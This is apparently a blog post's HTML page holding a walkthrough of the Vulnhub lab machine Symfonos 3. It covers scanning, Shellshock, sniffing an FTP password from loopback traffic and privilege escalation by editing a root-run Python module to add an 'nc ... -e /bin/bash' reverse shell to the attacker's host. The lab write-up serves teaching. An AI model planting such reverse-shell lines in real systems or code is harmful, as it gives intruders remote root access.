@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Vulnhub - Symfonos 3 - Pwnfuzz Blog</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="Pwnfuzz Blog" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">Pwnfuzz Blog</div>
+					
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">Home</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/tags/">
+				
+				<span class="menu__text">Tags</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/about/">
+				
+				<span class="menu__text">About</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+    <article class="post">
+        <header class="post__header">
+            <h1 class="post__title">Vulnhub - Symfonos 3</h1>
+            <p class="post__subtitle">Write-Up</p>
+            <div class="post__meta">
+                <span class="post__author">
+                    <i class="fas fa-user"></i> D4mianwayne
+                </span>
+                <span class="post__date">
+                    <i class="far fa-calendar-alt"></i> August 4, 2019
+                </span>
+                
+                <span class="post__categories">
+                    <i class="fas fa-folder"></i>
+                    
+                        
+                        <a href="/categories/vulnhub">Vulnhub</a>
+                    
+                </span>
+                
+                <span class="post__reading-time">
+                    <i class="far fa-clock"></i> 4 min read
+                </span>
+            </div>
+        </header>
+
+        
+
+        <div class="post__content clearfix">
+            <p>This is a walkthrough of Symfonos 3 which is 3rd machine in Symfonos series.</p>
+<!-- more -->
+<h1 id="nmap">Nmap</h1>
+<p>Let&rsquo;s scan the network and start working on the machine right away. Using <code>nmap -sV -sC -A -p- -T5 192.168.43.22</code> shows that we have FTP, SSH and HTTP.</p>
+<p><img src="/img/symfonos3/nmap.png" alt=""></p>
+<h1 id="http-enumeration">HTTP Enumeration</h1>
+<p>This was kind of time consuming since it involves lots of nested directory busting, I mostly use gobutser so with some bash scripting I automated the scan by updating the script with every finding.
+My strategy for that was to copy every dictionary/wordlists into a single directory and using the bash we used it to find the directories. I used <strong>dirbuster</strong> and <strong>dirb</strong> wordlists only.</p>
+
+<p>First, I found <code>gate</code>, then <code>cerberus</code> after that <code>tartarus</code>. After that I tried again with the script this time we got more than 4 hits:-</p>
+
+<p>But somehow <code>research</code> was a rabbit hole, perhaps a wild goose chase for us. Then, I tried again with <code>cgi-bin</code> from previous findings. Now directory busting to the <code>http://192.168.43.22/cgi-bin</code>, I found a hit at <code>underworld</code>. PS: In case you don&rsquo;t know about greek mythology, underworld is home of the god <strong>Hades</strong>.</p>
+
+<hr>
+<p>root@kali:/usr/share/wordlists/dirb# ./new.sh
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/.hta (Status: 403)
+/underworld (Status: 200)</p>
+<hr>
+<p><img src="/img/symfonos3/underworld.png" alt="">
+There, we got the <code>underworld</code>, the real game begins from here.</p>
+<h1 id="reverse-shell-and-ftp-network-sniffing">Reverse Shell and FTP Network Sniffing</h1>
+<p>From that page we can see that it&rsquo;s saying <code>uptime</code>, I tried to enumerate more but somehow none worked. I switched to some research on similar machines to get information about this thinking that it might have been some kind of task of a machine.
+From that I found a machine from PentesterLab which has <strong>kind of</strong> vulnerability but after checking it I was confirmed that it was same. The vulnerability is named <strong>ShellShock</strong>. In this type of vulnerablity you have the pass the bash command as a User-Agent for that particular request. So, using the following command with the help of curl, we get a reverse shell on our host machine.</p>
+
+<p>Once, we get reverse shell I found out we have privilge of cerberus, so from some basc enumeration I didn&rsquo;t found anything so I thought of using the <code>pspy</code> script which is useful for tracing the background proccesses. Using <code>pspy</code>  after using wget to grab it from server I found out there is a ftp server is running in the background. I thought of checking the directory too but permission denied.
+Now, I started grabbing the network dump using tcpdump since it ws available for usage, using <code>tcpdump -w ftplog.pcap -i lo</code>, the FTP server was runiing on the <code>lo</code> interface because the other one has our reverse shell connected to using shellshock. SInce, I first grabbed the <code>en0ps17</code> but I saw that our curl is making request to server.</p>
+<p><img src="/img/symfonos3/pspy.png" alt=""></p>
+<blockquote>
+<p>Warning: Let the tcpdump run for 5-10 minutes so you can grab enough data to analyse.</p></blockquote>
+<p>I saved the file in <code>/tmp</code> folder and started a HTTP server using python <code>python -m SimpleHTTPServer 1234</code> and grabbed the <code>ftplog.pcap</code> right away from <code>http://192.168.43.22:1234</code>.</p>
+<p>After opening it in wireshark and filtering out the packets for FTP only with <code>tcp.port == 21</code>, I got some packets with FTP service and following TCP Stream of that packet I found the user <code>hades</code> password.</p>
+<p><img src="/img/symfonos3/hades.png" alt=""></p>
+<h1 id="root">Root</h1>
+<p>Once you SSH into the system as user <strong>hades</strong> with the above password you&rsquo;ll find out that we have the same thing as user cerberus. So, the last option was to run the <code>pspy</code> again, doing that so I found that we have nothing more nothing less than previous scan. I started trying again in ftpclient, this time we can access the folder which has a python script which is running the server by the <strong>root</strong> itself. So, there is <strong>more to see than meets the eye</strong>.</p>
+<p>After analysing the script I found that script is using a module named <code>ftplib.py</code> in <code>/opt/ftpclient</code> which is running as root, as from my previous experience I thought that we need to edit the module file itself to get root privilges or anything to get moving. I checked permission and it turns out we can edit it since the user <code>hades</code> ia belong to group <code>gods</code>.</p>
+<p><img src="/img/symfonos3/ftpclient.png" alt=""></p>
+<p>Now, I added a line <code>os.system(&quot;nc 192.168.43.243 4444 -e /bin/bash)</code> in the file so that once the script will be run our reverse shell gets executed giving a root shell. So, once done I started my listener and start analysing the process again, once that script runs we have the shell as <strong>root</strong>.
+Hence, the flag.</p>
+<p><img src="/img/symfomos3/root.png" alt=""></p>
+<p>Thanks to <a href="https://twitter.com/zayotic">@zayotic</a> for making this wonderful machine.</p>
+
+        </div>
+
+        
+        <footer class="post__footer">
+            <div class="post-tags">
+                <i class="fas fa-tags"></i>
+                
+                    <a href="/tags/nmap-ctf-vulnhub" class="tag">nmap, ctf, vulnhub</a>
+                
+            </div>
+        </footer>
+        
+    </article>
+
+    <div class="post-navigation">
+        
+            <a href="/2019/07/rop-ret2libc-attack/" class="post-navigation__prev">
+                <i class="fas fa-arrow-left"></i>
+                <span>ROP - ret2libc attack</span>
+            </a>
+        
+        
+            <a href="/2019/08/vulnhub-tempus-fugit/" class="post-navigation__next">
+                <span>Vulnhub - Tempus Fugit</span>
+                <i class="fas fa-arrow-right"></i>
+            </a>
+        
+    </div>
+</main>
+
+			</div>
+			<aside class="sidebar"><div class="widget-search widget">
+	<form class="widget-search__form" role="search" method="get" action="https://google.com/search">
+		<input class="widget-search__field" type="search" placeholder="Search…" value="" name="q" aria-label="Search…">
+		<input class="widget-search__submit" type="submit" value="Search">
+		<input type="hidden" name="sitesearch" value="http://localhost:1313/">
+	</form>
+</div>
+<div class="widget-recent widget">
+	<h4 class="widget__title">Recent Posts</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/2025/03/cve-2025-2825-crushftp-authentication-bypass-analysis/">CVE 2025-2825 - CrushFTP Authentication Bypass Analysis</a></li>
+			<li class="widget__item"><a class="widget__link" href="/2025/01/exploring-recent-cves-in-hpe-insight-remote-support/">Exploring Recent CVEs in HPE Insight Remote Support</a></li>
+			<li class="widget__item"><a class="widget__link" href="/2024/11/cve-2024-37397-ivanti-endpoint-manager-xxe-vulnerability/">CVE 2024-37397 - Ivanti Endpoint Manager XXE Vulnerability</a></li>
+			<li class="widget__item"><a class="widget__link" href="/2024/05/cve-2024-4040-crushftp-server-side-template-injection-vulnerability-analysis/">CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability Analysis</a></li>
+			<li class="widget__item"><a class="widget__link" href="/2023/06/hackthebox-soccer/">HackTheBox - Soccer</a></li>
+		</ul>
+	</div>
+</div>
+<div class="widget-categories widget">
+	<h4 class="widget__title">Categories</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/cve-analysis/">CVE Analysis</a></li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/hackthebox/">HackTheBox</a></li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/pwning/">Pwning</a></li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/vulnhub/">Vulnhub</a></li>
+		</ul>
+	</div>
+</div>
+<div class="widget-taglist widget">
+	<h4 class="widget__title">Tags</h4>
+	<div class="widget__content">
+		<a class="widget-taglist__link widget__link btn" href="/tags/.net/" title=".NET">.NET (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/auth-bypass/" title="Auth-Bypass">Auth-Bypass (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-37297/" title="CVE-2024-37297">CVE-2024-37297 (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-4040/" title="Cve-2024-4040">Cve-2024-4040 (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-53675/" title="CVE-2024-53675">CVE-2024-53675 (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-53676/" title="CVE-2024-53676">CVE-2024-53676 (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2025-2825/" title="CVE-2025-2825">CVE-2025-2825 (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/dstat-sqlmap-upstream_proxy-websocket/" title="Dstat, Sqlmap, Upstream_proxy, Websocket">Dstat, Sqlmap, Upstream_proxy, Websocket (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/java/" title="Java">Java (3)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/logic-flaw/" title="Logic-Flaw">Logic-Flaw (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/nmap-ctf-vulnhub/" title="Nmap, Ctf, Vulnhub">Nmap, Ctf, Vulnhub (4)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/oob-xxe/" title="OOB-XXE">OOB-XXE (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/path-traversal/" title="Path Traversal">Path Traversal (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/pwn-hackthebox-v8-kernel-heap-tcache-libc-2.29/" title="Pwn, Hackthebox, V8, Kernel, Heap, Tcache, Libc-2.29">Pwn, Hackthebox, V8, Kernel, Heap, Tcache, Libc-2.29 (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/pwn-tcache-libc-2.27-hackthebox/" title="Pwn, Tcache, Libc-2.27, Hackthebox">Pwn, Tcache, Libc-2.27, Hackthebox (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/rce/" title="RCE">RCE (2)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/rop-bof-ret2csu-ctf/" title="Rop, Bof, Ret2csu, Ctf">Rop, Bof, Ret2csu, Ctf (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/rop-pwn-bof/" title="Rop, Pwn, Bof">Rop, Pwn, Bof (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/rop-pwn-radare2-pwntools/" title="Rop, Pwn, Radare2, Pwntools">Rop, Pwn, Radare2, Pwntools (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/rop-pwn-ret2libc-bof/" title="Rop, Pwn, Ret2libc, Bof">Rop, Pwn, Ret2libc, Bof (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/ssti/" title="SSTI">SSTI (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/xxe/" title="XXE">XXE (2)</a>
+	</div>
+</div>
+</aside>
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2025 Pwnfuzz Blog.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
